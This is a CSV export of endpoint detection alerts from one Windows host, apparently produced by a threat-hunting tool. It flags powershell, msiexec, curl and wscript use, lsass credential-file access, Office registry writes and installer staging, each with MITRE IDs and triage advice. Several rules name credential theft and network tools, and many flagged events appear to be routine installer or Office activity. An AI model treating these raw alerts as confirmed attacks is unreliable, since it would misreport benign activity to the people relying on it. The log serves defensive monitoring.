"Jun 1, 2026 @ 14:23:12.339",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_nbmrvwln.k5p.ps1,,creation,"2,204",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-65881A73
"Jun 1, 2026 @ 14:21:44.260",C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,c:\Windows\System32\MsiExec.exe -Embedding 17B454BD89D4606AD8583AC7E96BFAA3 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,end,"25,464",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-A973EF64
"Jun 1, 2026 @ 14:21:41.008",C:\Windows\SysWOW64\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\syswow64\MsiExec.exe -Embedding 189C0A08651FD6F8AF60DDA3DCD42393 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,end,"37,284",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-03E12AB4
"Jun 1, 2026 @ 14:21:43.245",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF2710CA8D7EE71E47.TMP,,creation,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-2ADC4E91
"Jun 1, 2026 @ 14:21:44.241",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFE7A759CD128CD015.TMP,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-6CE0489F
"Jun 1, 2026 @ 14:21:44.232",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\CMP591.tmp,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-53F8EA0C
"Jun 1, 2026 @ 14:23:19.748",C:\Windows\System32\curl.exe,,,LOLBin Abuse,50,Living-off-the-land binary: curl.exe,127.0.0.1,127.0.0.1,,,,connection_accepted,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-6D1291D3
"Jun 1, 2026 @ 14:21:39.509",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFA6CF58F909D171E0.TMP,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-C31E8F74
"Jun 1, 2026 @ 14:23:13.169",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"2,204",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-5BAB9DCF
"Jun 1, 2026 @ 14:21:38.539",C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\System32\MsiExec.exe -Embedding 0F11E21D2A1C2C53A06BA3DAFA972429 E Global\MSI0000,LOLBin Abuse | PowerShell Payload,50,Living-off-the-land binary: msiexec.exe ; Suspicious PowerShell keyword in command,,,,,,start,"12,192",T1218,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-EA0310D2
"Jun 1, 2026 @ 14:23:14.247",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"33,860",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-5ED0B297
"Jun 1, 2026 @ 14:23:15.645",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_0ucesdw0.nn3.psm1,,creation,"11,540",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-E0AFE489
"Jun 1, 2026 @ 14:24:03.157",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,50,Living-off-the-land binary: wscript.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1002\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,,,modification,"33,896",T1059.005,Visual Basic,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-E0E4288A
"Jun 1, 2026 @ 14:24:03.156",C:\Windows\System32\wscript.exe,,,LOLBin Abuse,50,Living-off-the-land binary: wscript.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1002\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,,,modification,"33,896",T1059.005,Visual Basic,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-B467142E
"Jun 1, 2026 @ 14:21:39.508",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,50,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFE03EA4ADE8ABB554.TMP,,deletion,"5,516",T1218,,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-01D8392A
"Jun 1, 2026 @ 14:23:15.642",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_cwxcdz2s.bj5.ps1,,creation,"11,540",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-AA996E20
"Jun 1, 2026 @ 14:23:16.472",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,50,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Review full command line and parent process chain,AH-22B4B5B4
"Jun 1, 2026 @ 14:23:58.890",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-799B852B
"Jun 1, 2026 @ 14:23:20.080",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,x1.c.lencr.org,lookup_result,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-D1FF4094
"Jun 1, 2026 @ 14:23:58.406",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,45,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_A7BRHFHZBWH4EDA4C7DUA7HKEEAABQHJ.R,,rename,"25,556",,,False,MEDIUM,MEDIUM,Needs Review,Review,Review process network history; identify C2 pattern,AH-9665ED45
"Jun 1, 2026 @ 14:23:58.421",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,45,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_DNE4CFAVASBNGQGKBJG5H7G2GBCNDPAJ.R,,creation,"25,556",,,False,MEDIUM,MEDIUM,Needs Review,Review,Review process network history; identify C2 pattern,AH-FF8EE7AA
"Jun 1, 2026 @ 14:23:37.003",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-033A82F3
"Jun 1, 2026 @ 14:23:37.022",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-A2427871
"Jun 1, 2026 @ 14:23:20.066",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,x1.c.lencr.org,lookup_requested,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-EBE7BABB
"Jun 1, 2026 @ 14:23:58.528",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-3DEC82ED
"Jun 1, 2026 @ 14:23:58.413",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,45,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_H6GZFSHPCNBKBACEBUGJFFFUDXCSHZD7.R,,creation,"25,556",,,False,MEDIUM,MEDIUM,Needs Review,Review,Review process network history; identify C2 pattern,AH-D99F266E
"Jun 1, 2026 @ 14:23:36.386",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-5C567604
"Jun 1, 2026 @ 14:23:20.157",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,r12.c.lencr.org,lookup_requested,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-8FB5CB0E
"Jun 1, 2026 @ 14:23:36.367",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-56B970D1
"Jun 1, 2026 @ 14:23:20.172",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,,r12.c.lencr.org,lookup_result,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-C977B647
"Jun 1, 2026 @ 14:23:41.030",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-61F3B6B9
"Jun 1, 2026 @ 14:23:40.941",C:\Windows\System32\lsass.exe,,,Sigma Match,45,Unusual process accessing LSASS memory,,,,C:\Users\DELL\AppData\Local\Microsoft\Credentials\1493D94F16BCC1D8457EDBEAD8D3BBD1,,overwrite,992,T1003.001,,False,MEDIUM,HIGH,Needs Review,Review,Review matching Sigma rule for context-specific guidance,AH-4B4761F2
"Jun 1, 2026 @ 14:21:18.168",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\orgchart.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\orgchart.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-E369DF94
"Jun 1, 2026 @ 14:21:18.248",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\scanpst.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\scanpst.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-4C27EDD1
"Jun 1, 2026 @ 14:22:58.474",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,External Communication | LOLBin Abuse,40,Living-off-the-land binary: powershell.exe ; Outbound to external IP: 217.160.0.149,173.10.254.170,217.160.0.149,,,,disconnect_received,"1,860",T1059.001,PowerShell,False,MEDIUM,MEDIUM,Needs Review,Review,Block destination IP at perimeter; review netflow,AH-B0A732D9
"Jun 1, 2026 @ 14:21:18.171",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msosrec.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msosrec.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-7B4669D8
"Jun 1, 2026 @ 14:21:18.169",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\powerpnt.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powerpnt.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-D1010419
"Jun 1, 2026 @ 14:21:17.516",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msoadfsb.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msoadfsb.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-E33E6B06
"Jun 1, 2026 @ 14:21:17.511",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msoasb.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msoasb.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-A2A667CC
"Jun 1, 2026 @ 14:21:17.110",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\sdxhelper.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sdxhelper.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-0566DC90
"Jun 1, 2026 @ 14:21:16.667",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\winword.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winword.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-AD6296C9
"Jun 1, 2026 @ 14:21:18.136",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\mspub.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspub.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-36DD556C
"Jun 1, 2026 @ 14:21:45.815",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1041\thm.wxl,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-C11EF935
"Jun 1, 2026 @ 14:21:45.819",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1046\thm.wxl,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-0596CDBF
"Jun 1, 2026 @ 14:21:45.817",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1045\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-24CF2062
"Jun 1, 2026 @ 14:21:47.388",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1036\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-2B7DFBEC
"Jun 1, 2026 @ 14:21:47.389",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1040\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-20E2FE36
"Jun 1, 2026 @ 14:21:47.386",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1029\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-0700ED2A
"Jun 1, 2026 @ 14:21:47.387",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1031\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-F8BDE282
"Jun 1, 2026 @ 14:21:47.390",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1041\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-6CC0A5CE
"Jun 1, 2026 @ 14:21:47.391",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1042\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-66CA8ABB
"Jun 1, 2026 @ 14:21:47.394",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1055\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-2EAD3033
"Jun 1, 2026 @ 14:21:47.393",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1046\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-A5EB4B42
"Jun 1, 2026 @ 14:21:47.399",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-F12DDEB9
"Jun 1, 2026 @ 14:21:47.396",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\3082\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-279BC4E9
"Jun 1, 2026 @ 14:21:47.398",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-41104B4B
"Jun 1, 2026 @ 14:21:45.823",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\2052\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-7EBE900E
"Jun 1, 2026 @ 14:21:45.824",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\3082\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-742A988F
"Jun 1, 2026 @ 14:21:45.826",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-68C29731
"Jun 1, 2026 @ 14:21:47.384",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1028\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-135F40A2
"Jun 1, 2026 @ 14:21:47.049",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,,,modification,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-09160C62
"Jun 1, 2026 @ 14:23:19.842",C:\Windows\System32\curl.exe,,,External Communication | LOLBin Abuse,40,Living-off-the-land binary: curl.exe ; Outbound to external IP: 34.117.59.81,173.10.254.170,34.117.59.81,,,,connection_attempted,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Block destination IP at perimeter; review netflow,AH-EAAA5B63
"Jun 1, 2026 @ 14:21:45.808",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1028\thm.wxl,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-87889E29
"Jun 1, 2026 @ 14:21:45.810",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1031\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-821FA96A
"Jun 1, 2026 @ 14:21:45.813",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1040\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-F087C657
